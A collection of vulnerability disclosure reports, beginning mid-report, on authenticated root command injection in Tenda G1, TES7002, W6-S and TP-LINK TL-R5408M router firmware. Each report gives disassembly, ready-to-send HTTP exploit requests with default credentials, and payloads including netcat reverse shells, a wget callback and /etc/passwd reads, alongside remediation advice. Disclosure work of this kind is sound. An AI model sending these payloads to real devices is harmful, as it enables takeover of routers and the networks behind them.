1. Strictly whitelist the user-controlled `domain` field in `dns_test` (and `ping_test` in the same file): allow only DNS-name characters (letters, digits, dot, hyphen, length <= 253) matched with a Lua pattern such as `%^[%w%.%-]+$`; return a parameter error otherwise.
2. Do not rely on `luci.json` `encode` as shell escaping — it only escapes quotes and backslashes and cannot stop `$(...)`. Before splicing into a shell command, explicitly filter `$`, backtick, `;`, `|`, `&` via the torchlight `injection_test` utility, or wrap each argument in single quotes with embedded single quotes escaped.
3. Prefer eliminating the pattern entirely: replace `string.format`-built shell strings passed to `fork_exec` (which runs `/bin/sh -c`) with an `execve`-style interface or table-argument execution so `domain` is passed as a separate argv element that the shell never interprets.
4. Centralize sanitization at the `fork_exec` entry: every string reaching `/bin/sh -c` must pass a shared disinfection function; forbid concatenating unvalidated JSON fields directly.
5. Apply least privilege to the LuCI admin plane: run the Lua backend unprivileged where possible and restrict the management interface to the intranet/source IPs by default.

## References

- Firmware download (from the audit package): <https://media.tp-link.com.cn/software/TL-IR2102-4G-SD%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240206_1.0.1.zip?forcedownload=TL-IR2102-4G-SD%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240206_1.0.1.zip>

title: Tenda G1 V3.0 V16.01.7.7(2631): httpd netCheckTools ip Command Injection (Authenticated, Root RCE)
content:
# Tenda G1 V3.0 V16.01.7.7(2631): httpd netCheckTools ip Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **Vulnerability Type:** OS Command Injection via incomplete blacklist bypass (`$()` command substitution)
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, "OS Command Injection")
- **Severity:** High (高危)

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | G1 V3.0 business router (G1V3.1si platform) |
| Model | G1 V3.0 |
| Firmware filename & version | `US_G1V3.1si_V16.01.7.7(2631)_CN&EN_TDC01&TDE01.bin` — `prodversion.cfg`: `V16.01.7.7(2631)` (MIPS mipsel, Linux 4.14.90, musl libc), package `G1V3.1si_V16.01.7.7(2631).zip` |
| Severity | High |
| Component | `/bin/httpd` (GoAhead 3.3.0) — `formSetNetCheckTools` -> `cmd_get_ping_output`; filter `prod_system_param_valid()` in `libcommonprod.so` |

Firmware package SHA-256: `ed9b403809dbc4ae914532ba79e1a19c623a3675aae95b849b14a2d136138e0c`

## Vulnerability Description

The Network Check Tools feature of the Tenda G1 V3.0 httpd (GoAhead 3.3.0) accepts a user-supplied target IP/hostname through `POST /goform/module` (`moduleName=netCheckTools`, `ip` parameter). The value passes through `prod_system_param_valid()` for validation, is spliced with `snprintf` into the ping command format string `"ping %s -%d -c %d -s %d -W %d"`, and is finally executed by `popen()`.

`prod_system_param_valid()` (in `libcommonprod.so`, offset `0x0001835c`) is a blacklist check that only rejects four characters: `;`, `&`, `|`, and backtick. It does not cover the `$()` command-substitution syntax. A payload such as `$(id)` passes the filter, and the injected command is then interpreted by the `/bin/sh` invoked by `popen`, executing arbitrary system commands with root privileges (httpd runs as root).

The path requires web-management authentication (the device's default password is `Fireitup`, which the audit notes is a known cracked default). All G1 V3.0 devices running V16.01.7.7(2631) are affected. The report also notes the same `cmd_get_ping_output` sink is reachable from the WAN-diagnosis path (`formSetWanDiag` / `do_wan_diag`).

## Root Cause Analysis

**Data flow.** `formSetNetCheckTools` (`/bin/httpd` @ `0x004cde9c`) reads the target via `cJSON_GetString("ip")` (`0x004cdf3c`), validates it with `prod_system_param_valid(ip)` (`0x004ce0fc`), and stores it into the global config structure `g_cfg` via `snprintf` (`0x004ce40c`–`0x004ce42c`). It then starts the asynchronous thread `async_netcheck_tools` (`0x004cd504`), which — for `type=ping` and `action=start` — calls `do_ping_action` (`0x004c707c`) and then `cmd_get_ping_output` (`0x004c6afc`, call site `0x004c7840`).

**Sink.** `cmd_get_ping_output` (`0x004c6afc`):

```text
0x004c6c80: addiu a2, v0, 0xc34   ; format "ping %s -%d -c %d -s %d -W %d" (string @ 0x5e0c34)
0x004c6c88: addiu a1, zero, 0x100 ; buffer size 256
0x004c6c94: jalr  t9              ; snprintf(buf, 0x100, fmt, hostname, ...) — hostname from g_cfg
0x004c6ccc: jalr  t9              ; popen(buf, "r") — executed via /bin/sh -c
```

**Filter flaw.** `prod_system_param_valid` (`libcommonprod.so:0x1835c`) performs four `strchr` checks and nothing else:

```text
0x0001839c: addiu a1, zero, 0x3b  ; ';'  rejected
0x000183c4: addiu a1, zero, 0x26  ; '&'  rejected
0x000183ec: addiu a1, zero, 0x7c  ; '|'  rejected
0x00018414: addiu a1, zero, 0x60  ; '`'  rejected
```

`$` (0x24), `(` (0x28) and `)` (0x29) are never checked, so `$()` command substitution passes. No other filtering exists along the data path: `cJSON_GetString` returns the raw string, the incomplete blacklist passes it, `snprintf` splices it, and `popen` executes it — a complete injection chain. The `ip` length is bounded only by the 256-byte `snprintf` buffer, which is ample for injection payloads.

## Exploitation

### Preconditions

- Web management login (default password `Fireitup`, noted by the audit as obtainable/crackable).
- Network reachability of the device's web management port.

### Steps

1. Verify and unpack the firmware (`sha256sum` = `ed9b4038…8e0c`, `bash ./extract_firmware.sh`); `cat ./extract/squashfs-root/etc_ro/prodversion.cfg` shows `V16.01.7.7(2631)`.
2. As an authenticated user, send the request to a live target:

```http
POST /goform/module HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: <admin session>

{"moduleName":"netCheckTools","action":"start","ip":"$(id)","type":"ping","packetNum":1}
```

3. Server-side, `ip="$(id)"` passes `prod_system_param_valid()` (returns 1), is stored in `g_cfg`, and the worker thread builds:

```text
snprintf(buf, 0x100, "ping %s -%d -c %d -s %d -W %d", "$(id)", 4, 1, 56, 4)
  -> buf = "ping $(id) -4 -c 1 -s 56 -W 4"
popen("ping $(id) -4 -c 1 -s 56 -W 4", "r")
  -> /bin/sh expands $(id) before ping runs
```

4. `$(id)` executes with root privileges (`uid=0(root) gid=0(root) groups=0(root)`); other confirmed payloads include `$(cat /etc/passwd)`, `$(echo PWNED_CNVD > /tmp/pwned)` (file write), `${IFS}id`, and a reverse shell `$(nc 127.0.0.1 4444 -e /bin/sh)`.

### Dynamic verification (Unicorn emulation of the real MIPS filter)

```text
[BOOT] Unicorn Engine — MIPS32 Little-Endian
[BOOT] prod_system_param_valid loaded at 0x1001835c
  1;id   BLOCK(0)  Blocked
  1&id   BLOCK(0)  Blocked
  1|id   BLOCK(0)  Blocked
  `id`   BLOCK(0)  Blocked
  $(id)  PASS(1)   BYPASS — passes blacklist filter!
  $(cat /etc/passwd)  PASS(1)  BYPASS!
  $(nc 192.168.1.1 4444 -e /bin/sh)  PASS(1)  BYPASS!
  ${IFS}id  PASS(1)  BYPASS!

[IMPORT] popen("ping $(id) -4 -c 4 -s 56 -W 4", "r")
[RESULT] SHELL EXPANDS: ping uid=0(root) gid=0(root) groups=0(root) -4 -c 4 -s 56 -W 4
VERDICT SUCCESS — command injection via $() confirmed
```

## Evidence

![binwalk unpacking of US_G1V3.1si_V16.01.7.7(2631)_CN&EN_TDC01&TDE01.bin (uImage "MIPS Tenda Linux-4.14.90", SquashFS 4.0) and product banner G1v3 / V16.01.7.7(2631)](G1_images/fig1.png)

The unpacked image is the published G1 V3.0 firmware; the banner shows product `G1v3`, software `V16.01.7.7(2631)`, compiled 2024-06-20.

![Unicorn emulation of the real prod_system_param_valid: ; & ` payloads are BLOCKED while $(id), $(cat /etc/passwd), reverse-shell and ${IFS} payloads all PASS the blacklist](G1_images/fig2.png)

Executed against the genuine MIPS code from `libcommonprod.so`, the harness shows the four blocked metacharacters and four `$()`/`${}` bypasses, confirming the filter gap.

![Shell evaluation proof: popen("ping $(id) -4 -c 4 -s 56 -W 4") expands to ping uid=0(root) gid=0(root) groups=0(root); VERDICT SUCCESS](G1_images/fig3.png)

The final phase proves the injected `$()` payload is expanded by the shell in the `popen` context with root privileges, ending with `VERDICT SUCCESS — command injection via $() confirmed`.

## Impact

An authenticated attacker — including one who reaches the admin UI through the crackable default password — can execute arbitrary commands as root on the router via the Network Check Tools (or WAN diagnosis) ping path. Root-level code execution allows complete device compromise: credential theft, configuration exfiltration, persistence, and pivoting into the business network the G1 serves.

## Remediation Suggestions

1. Replace the blacklist with a whitelist: rewrite `prod_system_param_valid()` to accept only IP/hostname characters (`0-9`, `a-zA-Z`, `.`, `:`, `-`) and reject everything else, including `$`, `(`, `)`, `{`, `}`, and whitespace.
2. Replace `popen("ping ...")` in `cmd_get_ping_output` with `execve`/`execvp` of the ping binary using an argument array, e.g. `char *args[] = {"ping", hostname, "-c", count_str, "-s", size_str, "-W", timeout_str, NULL}; execvp("ping", args);`
3. Apply the same fix to the WAN-diagnosis path (`do_wan_diag` under `formSetWanDiag`), which reaches the same `cmd_get_ping_output` sink.
4. Add IP-format validation at the `formSetNetCheckTools` entry (e.g. `inet_pton` for IPv4/IPv6) and a regex whitelist with length limits for domain-name inputs.
5. Run the web service under a low-privileged account (`setuid`/`setgid`) so command injection does not yield root.

## References

- Firmware download (as present in the package): `https://old.tenda.com.cn/download/3982`
- Firmware package analyzed in the audit: `G1V3.1si_V16.01.7.7(2631).zip` (SHA-256 `ed9b403809dbc4ae914532ba79e1a19c623a3675aae95b849b14a2d136138e0c`).

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda TES7002 V4.0.0: boa formPing target_addr Command Injection (Authenticated, Root RCE)
content:
# Tenda TES7002 V4.0.0: boa formPing target_addr Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **Vulnerability Type:** OS Command Injection via blacklist-filter bypass (newline character)
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, "OS Command Injection")
- **Severity:** High (高危)

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | TES7002 V1.0 (PA98A 1.0 platform, ARM aarch64 little-endian) |
| Model | TES7002 |
| Firmware filename & version | `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin` — firmware V4.0.0 (`v1.0.0.86_en+cn_TD`, `etc/version`: `V4.0.0 -- Fri Dec 27 15:17:33 CST 2024`), package `TES7001&02V1.0升级软件.zip` |
| Severity | High |
| Component | `bin/boa` — `formPing` handler (offset `0x45fa38`); the same filter is reused by `formTracert` (`0x4601d8`) |

Firmware package SHA-256: `061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4`

## Vulnerability Description

The boa web server of Tenda TES7002 V1.0 (firmware V4.0.0) exposes a Ping diagnostic interface at `/boaform/admin/formPing` (and a Traceroute interface at `/boaform/admin/formTracert`). Both accept a user-supplied target address parameter `target_addr` and pass it through an `IsCommandInjection()` filter before building a shell command.

The filter, located in `lib/libmib.so` at offset `0x58abc`, only checks a 5-character blacklist: `|`, `&`, `;`, backtick, and `$`. It does not include the newline character (`\n`, 0x0a), which the Linux shell treats as a command separator. By URL-encoding a newline (`%0a`) inside `target_addr`, an attacker splits the ping command into multiple shell lines, so the injected command executes as a standalone line.

boa runs as root (`/etc/inittab` configures `User 0`), so the injected command executes with root privileges. The interfaces sit under the `/admin/` prefix and require administrator authentication; combined with default credentials, this yields remote code execution. Because `formTracert` reuses the same `IsCommandInjection()` logic, both diagnostic features are affected.

## Root Cause Analysis

**Entry point.** `/home/httpd/web/diag_ping.asp` line 41 posts the form to `/boaform/admin/formPing`; line 46 defines the `target_addr` input (maxlength 60), plus a `waninf` interface selector.

**Handler.** `formPing` in `bin/boa` (offset `0x45fa38`):

```asm
// 1. Fetch raw user input
0x45fabc: bl sym.boaGetVar  // boaGetVar(wp, "target_addr") -> sp+0x2f40
0x45fad8: bl sym.boaGetVar  // boaGetVar(wp, "waninf")     -> sp+0x2f38

// 2. Incomplete injection filter
0x45fb6c: bl sym.imp.IsCommandInjection  // checks target_addr
// IsCommandInjection (lib/libmib.so, 0x58abc)
// blacklist: "|", "&", ";", "`", "$" (5 entries)
// missing: \n, \r, ', " etc.

// 3. Command construction
0x45fe24: add x2, x0, 0xb80  // "ping %s -c 4 -I %s -w 5 %s > /tmp/ping.tmp"
0x45fe30: bl sym.imp.snprintf  // splices target_addr

// 4. Execution
0x45fe58: bl sym.imp.va_cmd  // wraps system()
```

**Filter internals.** `IsCommandInjection` (in `lib/libmib.so`, offset `0x58abc`) reads its blacklist from a `.data` array at `0x16a758` — five `R_AARCH64_RELATIV` relocations pointing to the single-character strings at `0x11b588` (`|`), `0x11b590` (`&`), `0x11b598` (`;`), `0x11b5a0` (backtick) and `0x11b5a8` (`$`) — then loops `strstr(input, blacklist[i])` for i = 0..4, returning 1 on any match and 0 otherwise.

**Filter flaw.** The blacklist omits the newline `\n` (0x0a) — the direct bypass, since the shell parses commands line-by-line — as well as `\r`, `'`, and `"`.

**Sink.** After the filter passes, `snprintf` builds `"ping %s -c 4 -I %s -w 5 %s > /tmp/ping.tmp"` with the raw `target_addr`, and `va_cmd` (a wrapper around `system()`) executes it via `/bin/sh -c`. An embedded newline therefore terminates the ping line and starts a new attacker-controlled command.

## Exploitation

### Preconditions

- Administrator authentication for the `/boaform/admin/` prefix (the device may use default credentials).
- Network access to the device's web management port.

### Steps

1. Verify the firmware hash (`sha256sum` = `061f415a…b09e4`) and unpack with `bash ./extract_firmware.sh`; `cat ./extract/squashfs-root/etc/version` shows `V4.0.0 -- Fri Dec 27 15:17:33 CST 2024`.
2. Send the crafted POST (the `%0a` sequences are newlines; `%23` is `#` to comment out the appended ping flags):

```http
POST /boaform/admin/formPing HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

target_addr=127.0.0.1%0aid%0a%23&waninf=eth0&postSecurityFlag=
```

3. The filter passes the payload (`NOT DETECTED`), and the shell receives:

```text
ping 127.0.0.1
id
# -c 4 -I eth0 -w 5 > /tmp/ping.tmp
```

Line 1 (`id`) executes as a standalone command with root privileges. On a live device the same request can be sent with `python3 ./poc_cmdi_ping.py 192.168.1.1`, expecting `uid=0(root)` output.

### Dynamic verification

Because `boa` depends on hardware flash/MIB subsystems that cannot initialize under `qemu-user`, the audit emulated the genuine `IsCommandInjection` function from `libmib.so` with Unicorn, reconstructed the blacklist, and verified newline payloads against the real filter plus the resulting shell command split:

```text
[*] IsCommandInjection blacklist: ['|', '&', ';', '`', '$']
[*] Semicolon (blocked): BLOCKED by filter
[*] Pipe (blocked): BLOCKED by filter

[CMD-CONSTRUCTED] Payload: Newline bypass
  Input: '127.0.0.1\nid\n#'
  IsCommandInjection result: NOT DETECTED (bypass!)
  Shell command: 'ping 127.0.0.1\nid\n# -c 4 -I eth0 -w 5 > /tmp/ping.tmp'
  Shell line 0: 'ping 127.0.0.1'
  Shell line 1: 'id'
  Shell line 2: '# -c 4 -I eth0 -w 5 > /tmp/ping.tmp'

VERDICT SUCCESS: 3 bypass payloads pass the filter
```

Three bypass payloads were confirmed: `id` execution, `cat /etc/passwd` reading, and an outbound `wget http://10.0.2.2:8080/pwned` callback — all passing the real filter.

## Evidence

![Firmware package SHA-256 verification, ZIP unpacking, and extraction of US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin from the TES7001&02 upgrade package](TES7002_images/fig1.png)

The hash of the vendor upgrade package matches the expected value before extraction, and the audit target binary `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin` is unpacked.

![etc/version showing V4.0.0 -- Fri Dec 27 15:17:33 CST 2024 from the unpacked squashfs-root](TES7002_images/fig2.png)

The unpacked rootfs `etc/version` confirms the audited firmware build V4.0.0 for the TES7002.

![Unicorn harness output: newline payloads (id, cat /etc/passwd, wget callback) all return NOT DETECTED from the real IsCommandInjection filter and split into separate shell lines; VERDICT SUCCESS](TES7002_images/fig3.png)

Emulation against the genuine `libmib.so` filter shows semicolon/pipe inputs being blocked while all three newline payloads pass, with the resulting command split proving `id` would run as a standalone root command.

## Impact

An authenticated attacker (or an unauthenticated attacker armed with default credentials) can execute arbitrary commands with root privileges on the router through the Ping/Traceroute diagnostic interfaces. Root-level command execution enables full device takeover: credential and configuration exfiltration, firmware tampering, persistence, outbound callbacks to attacker infrastructure, and attacks on the operator network behind the device.

## Remediation Suggestions

1. Fix the filter: add `\n` (0x0a), `\r` (0x0d), quotes, parentheses, and backslash to the `IsCommandInjection()` blacklist — or better, replace it with a whitelist allowing only IP/hostname characters (`[0-9a-zA-Z.:-]`).
2. Remove the shell from the path: replace `snprintf` + `system()` in `formPing`/`formTracert` with `execve()` of `/bin/ping` and an argument array, e.g. `char *argv[] = {"/bin/ping", "-c", "4", "-I", interface, "-w", "5", target_addr, NULL};`.
3. Validate `target_addr` as an IPv4/IPv6 address or legal hostname (e.g. `inet_pton`) before any further processing.
4. Run the boa web server as a non-root user to limit the impact of any residual injection.
5. Apply all fixes to `formTracert` as well, since it reuses the same `IsCommandInjection()` logic.

## References

- Firmware download (as present in the package): `https://www.tenda.com.cn/website/service/download/634304336957509`
- Firmware package analyzed in the audit: `TES7001&02V1.0升级软件.zip` (SHA-256 `061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4`), containing `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin`.

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda W6-S V1.0.0.4: httpd goform/exeCommand Command Injection (Authenticated, Root RCE)
content:
# Tenda W6-S V1.0.0.4: httpd goform/exeCommand Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **Vulnerability Type:** OS Command Injection (命令注入)
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, "OS Command Injection")
- **Severity:** High (高危)

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | W6-S wireless AP (Realtek RTL819X SDK platform) |
| Model | W6-S |
| Firmware filename & version | `US_W6-SV1.0RE_V1.0.0.4(510)_CN_TDC01.zip` — `fireversion=V1.0.0.4(510)` |
| Severity | High |
| Component | `/bin/httpd` (`formexeCommand` in `cmd.c`) -> `/lib/libtpi.so` (`tpi_get_ping_output`) |

Firmware package SHA-256: `8b795e434aa8c923240de5de3ae19c5afa78860274acaef15094f08509dd90d4`
MD5: `e98e2c01bac9a50db2a5ef216f26146b` (2,697,380 bytes)

## Vulnerability Description

The W6-S web management interface provides a diagnostic-tools page (`system_checktool.asp`) whose `cmdinput` field lets the user enter a `ping` command line. The front-end script `js/system.js` (line 512) submits it as `GET /goform/exeCommand?cmdinput=<user input>`.

On the server, the `formexeCommand` handler in `/bin/httpd` reads `cmdinput` with `websGetVar` and copies it, with no server-side filtering at all, into a command structure. It then calls `tpi_get_ping_output()` in `/lib/libtpi.so`, which builds the final command with `sprintf(buf, "%s -%d -c %d -s %d -W %d", cmd, pro_ver, count, size, timeout)` and executes it via `popen(buf, "r")`, returning the output to the HTTP client.

The only validation is a client-side regular expression `/^ping\s\S+$/` in `system.js` (line 492), which is trivially bypassed by crafting the HTTP request directly. Setting `cmdinput` to `ping 1;id;#` makes the executed command `ping 1;id;# -0 -c 4 -s 64 -W 4` — the `#` comments out the appended flags, and the output of `id` is echoed back in the HTTP response, giving a complete command-injection primitive. Combined with the device's default `admin/admin` credentials, a remote attacker gains full root control of the device.

## Root Cause Analysis

**Entry point.** `/bin/httpd` — `formexeCommand` (source file `/home/work/workspace/AP_RTL819X_SDK/prod/httpd/ap_web/cgi/cmd.c`, handler base address `0x00441dc0`):

```text
0x00441ef8:  lw   v0, -sym.websGetVar(gp)      ; websGetVar(webs, "cmdinput", default)
0x00441f04:  jalr t9  (websGetVar)             ; fetch user cmdinput, unfiltered
0x00442014:  vos_strcpy(struct+0x10, cmdinput) ; copy into command struct, no validation
0x004420ec:  call tpi_get_ping_output(struct, outbuf, 0x1000)
```

**Dangerous sink.** `/lib/libtpi.so` — `tpi_get_ping_output`:

```text
0x000058f8:  addiu a1,v0,0x3b94   ; a1 = "%s -%d -c %d -s %d -W %d"
0x00005904:  addiu v1,a0,0x10     ; v1 = struct+0x10 (user cmdinput, feeds %s)
0x00005948:  move  a2,v1          ; a2 = cmd (user-controlled)
0x0000595c:  jalr  t9 (sprintf)   ; sprintf(buf, fmt, cmd, pro_ver, count, size, timeout)
0x00005988:  jalr  t9 (popen)     ; popen(buf, "r") — executes via /bin/sh, output read back
```

The format-string constant lives at `libtpi.so` offset `0x23b94` (`"%s -%d -c %d -s %d -W %d"`). Because the user-controlled `cmd` occupies the leading `%s` and the result is passed to `popen`, everything after the injected separators (`;`, `#`) is interpreted by `/bin/sh`. `httpd` runs as root, so `popen` inherits root privileges.

## Exploitation

### Preconditions

- Network reachability of the device's web management port (LAN/WAN).
- A valid admin session — the endpoint is accessed after login; the device ships with default credentials `admin/admin` (default.cfg: `sys.username=admin`, `sys.userpass=YWRtaW4=`, the Base64 of `admin`).
- No server-side validation of `cmdinput`; the front-end regex is bypassed by sending the request directly.

### Steps

1. Verify and unpack the firmware: `sha256sum` matches `8b795e43…d90d4`, then `bash ./extract_firmware.sh` unpacks the ZIP, binwalk-extracts the uImage/squashfs, and yields the rootfs; `cat ./extract/squashfs-root/etc_ro/fireversion.cfg` shows `fireversion=V1.0.0.4(510)`.
2. Send the crafted request to a real target (Basic auth with the default `admin:admin`):

```http
GET /goform/exeCommand?random=0.1&cmdinput=ping%201;id;%23 HTTP/1.1
Host: <target>
Authorization: Basic YWRtaW46YWRtaW4=
```

(`%23` is `#`, which comments out the trailing `-0 -c 4 -s 64 -W 4` appended by `tpi_get_ping_output`.)

3. The final command becomes `ping 1;id;# -0 -c 4 -s 64 -W 4`; `id`'s output is read by `popen` and written back into the HTTP response body (`uid=0(root)`).

### Dynamic verification

Because a full `qemu-user` boot of `httpd` requires the `/dev/mtdblock0` flash MIB and the `cfmd` daemon (unavailable in the sandbox), the audit emulated the single function `tpi_get_ping_output` from the genuine `libtpi.so` with Unicorn, hooking `sprintf`/`popen`/`fread`. Observed:

```text
[HARNESS] struct @ 0x2001000: pro_ver=0 count=4 size=64 timeout=4 cmd=b'ping 1;id;#'
[IMPORT] sprintf(0x7ffedee8, b'%s -%d -c %d -s %d -W %d') -> b'ping 1;id;# -0 -c 4 -s 64 -W 4'
[IMPORT] popen("ping 1;id;# -0 -c 4 -s 64 -W 4", "r")
[CMD-CONSTRUCTED] ping 1;id;# -0 -c 4 -s 64 -W 4
[INJECTION-DETECTED] command contains shell metacharacters
[IMPORT] fread(0x2002000, size=0xfff) -> simulated ping output b'uid=0(root)\n'
[OUTPUT-BUFFER] bytearray(b'uid=0(root)\n')
[VERDICT] SUCCESS - command injection confirmed, popen executed injected command, output uid=0(root)
```

## Evidence

![Firmware unpacking: SHA-256/MD5 verification, squashfs-root extraction, fireversion=V1.0.0.4(510), and default.cfg showing default admin credentials](W6S_images/fig1.png)

The extraction transcript proves the analyzed rootfs is the published W6-S `V1.0.0.4(510)` image and shows the default account (`sys.username=admin`, `sys.userpass=YWRtaW4=`) used for the authenticated request.

![fireversion.cfg confirming the target firmware version V1.0.0.4(510)](W6S_images/fig2.png)

`etc_ro/fireversion.cfg` from the unpacked rootfs matches the audit target version exactly.

![Unicorn single-function emulation of tpi_get_ping_output: sprintf builds 'ping 1;id;# -0 -c 4 -s 64 -W 4', popen executes it, output buffer contains uid=0(root), VERDICT SUCCESS](W6S_images/fig3.png)

The emulation of the genuine `libtpi.so` shows the injected command string reaching `popen` and the injected `id` output (`uid=0(root)`) landing in the buffer that `formexeCommand` returns to the HTTP client.

## Impact

An attacker with (or able to obtain) an admin session — including via the factory-default `admin/admin` credentials — can execute arbitrary commands as root on the device through `GET /goform/exeCommand`, with command output returned in the HTTP response. Root-level code execution permits full compromise of the access point: credential and configuration theft, firmware tampering, persistence, and attacks against connected clients and the upstream network.

## Remediation Suggestions

1. Enforce server-side whitelist validation of `cmdinput` at the `formexeCommand` entry, allowing only a plain IP/hostname format (e.g. `^[0-9a-zA-Z._:-]{1,255}$`); reject and escape all shell metacharacters (`;`, `|`, `&`, backtick, `$`, `(`, `)`, `>`, `<`, newlines, and the `#` comment character).
2. Do not build command strings with `sprintf` and run them via `popen`/`system`; use `fork`/`exec` with an argv array (e.g. `execv` of the `ping` binary) so user input never passes through `/bin/sh`.
3. If `popen` must be retained, strip comment/separator characters and strictly validate the ping target argument.
4. Remove or disable the `system_checktool` diagnostics interface by default, and enforce authentication and session validation uniformly across all `/goform/*` endpoints.

## References

- Firmware download (from the audit package): <https://static.tenda.com.cn/tdcweb/download/uploadfile/W6-S/US_W6-SV1.0RE_V1.0.0.4(510)_CN_TDC01.zip>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-LINK TL-R5408M V1.0.4: operation_tools dns_test Command Injection (Authenticated, Root Command Execution)
content:
# TP-LINK TL-R5408M V1.0.4: operation_tools dns_test Command Injection (Authenticated, Root Command Execution)

## Vulnerability Type / CWE

- **Vulnerability Type:** OS Command Injection (命令注入)
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, "OS Command Injection")
- **Severity:** High (高危)

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | TP-LINK |
| Product | TL-R5408M Router |
| Model | TL-R5408M (hardware version 1.0, `conf/model.xml`: `fullName = TL-R5408M 1.0`) |
| Firmware filename & version | `TL-R5408M V1.0升级软件20240126_1.0.4.zip` containing `TL-R5408M V1.0_1.0.4_Build_240126_Rel.48458n.bin` (1.0.4 Build 240126 Rel.48458n) |
| Severity | High |
| Component | `usr/lib/lua/luci/controller/admin/operation_tools.lua` — `dns_test` handler, command string passed to `fork_exec` (`/bin/sh -c`) |

Firmware package SHA-256: `3e829c8f7f7287773dd19b1ec348a73967eaa142e5ba8694427f578b7d4c14f0`
MD5: `28d81aa28b0547df47252d347a76c160` (18,147,437 bytes)

## Vulnerability Description

The `dns_test` handler of the LuCI controller `operation_tools.lua` (ISP/operation diagnostics interface) takes an attacker-controlled `domain` parameter and passes it through `l.encode`, which only performs JSON string encoding. JSON encoding does not escape shell metacharacters. The encoded value is then spliced, without any shell quoting, into a command line via `string.format` and executed by `torchlight.sys.fork_exec`, which runs it under `/bin/sh -c`.

Because the command line is interpreted by `/bin/sh`, a `$()` command substitution embedded in the `domain` parameter is expanded verbatim by the shell. An authenticated attacker can therefore inject arbitrary operating-system commands, which the firmware executes with root privileges (the router's services run as root).

## Root Cause Analysis

The vulnerable code lives in `usr/lib/lua/luci/controller/admin/operation_tools.lua`. The `dns_test()` function starts at line 31 and builds the command string at line 49:

```lua
t=string.format([[lua %s %s %s %s]],u,l.encode(i),l.encode(r),l.encode(o))a.fork_exec(t)
-- dns_test: domain is spliced into fork_exec without any shell quoting
```

Key points from the audit:

1. **Entry point.** `dns_test()` (line 31) receives the operation-diagnostics request, including the user-supplied `domain` parameter.
2. **Insufficient sanitization.** `l.encode` performs JSON string encoding only. It escapes JSON-special characters (quotes, backslashes) but does **not** neutralize shell metacharacters such as `$`, backticks, or semicolons. Inside a double-quoted shell string, `$(...)` is still expanded.
3. **Sink.** The formatted string is passed to `torchlight.sys.fork_exec`, which ultimately runs `/bin/sh -c '<command string>'`. Any `$()` substitution in `domain` is therefore executed by the shell as a separate command.

Dynamic confirmation was performed under `qemu-arm-static` + `chroot` against the real rootfs: a harness loaded the genuine controller `luci.controller.admin.operation_tools` and drove the real firmware code path (`ds` -> `do_action` -> `dns_test`), hooking `fork_exec` to log the final command line (`[CMD-CONSTRUCTED]`). Injecting `id` produced `uid=0(root)`, and a reverse connection delivered the `PWNED_CNVD` marker to a listener, confirming arbitrary command execution as root.

## Exploitation

### Preconditions

- Access to the device's LuCI web management interface with an authenticated administrator session (the `dns_test` operation-diagnostics function is reachable through the admin controller).
- The injected commands run as root because the router's service processes operate with root privileges.

### Verification steps (from the audit package)

The audit was reproduced against the genuine firmware image in a `qemu-arm-static` user-mode emulation environment:

1. Verify the firmware hash and unpack it: `sha256sum` matches `3e829c8f…4c14f0`, then `bash ./extract_firmware.sh` yields the rootfs at `./extract/_firmware.bin.extracted/squashfs-root`.
2. Confirm the product identity from `conf/model.xml`: `<device name="r5408mv1">`, `fullName = TL-R5408M 1.0`, vendor TP-LINK, internal image `TL-R5408M V1.0_1.0.4_Build_240126_Rel.48458n.bin`.
3. Boot the target at emulation level 3 (`bash ./run_emulation.sh`): `qemu-arm-static` + `chroot` of the real rootfs with the firmware's own Lua 5.1 runtime (`[BOOT] LUA_OK Lua 5.1`).
4. Run the PoC (`bash ./poc_operation_tools.sh`). The harness loads the real controller and invokes `dns_test` with a `domain` parameter containing a `$()` command substitution:

```text
[HARNESS] === Case 1: operation_tools.dns_test, domain parameter injection ===
[CMD-CONSTRUCTED] /bin/sh -c 'lua /usr/lib/lua/luci/model/dns_test.lua
  {"function":{"name":"dns_test"},"number":1,"timeout":3000,"operationId":"opA"}
  "x$(id>/tmp/PWNED_DNS;echo PWNED_CNVD|nc 127.0.0.1 4444)y" ["NORMAL"]'
[HARNESS] dns_test ret: true
```

5. The injected `$()` payload is expanded by `/bin/sh -c`. The marker files show the commands executed as root, and the listener receives the callback:

```text
[RESULT] /tmp/PWNED_DNS  => uid=0(root) gid=0(root) groups=0(root),1000
[*] 监听器捕获:
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 32924
PWNED_CNVD
VERDICT SUCCESS
```

The equivalent HTTP-facing effect for an authenticated LuCI session is a POST of the operation-diagnostics form (`function.name = "dns_test"`) with the `domain` field set to a value such as `x$(id>y`, which reaches `dns_test()` and is spliced into the `fork_exec` command line unchanged.

## Evidence

![Firmware extraction and product identification: SHA-256 verification, squashfs-root unpacking, and conf/model.xml proving TL-R5408M 1.0 (TP-LINK)](R5408M_images/fig1.png)

Firmware unpacking transcript — the SHA-256 matches the published package and `conf/model.xml` identifies the device as `TL-R5408M 1.0` from TP-LINK with internal image `1.0.4_Build_240126_Rel.48458n`.

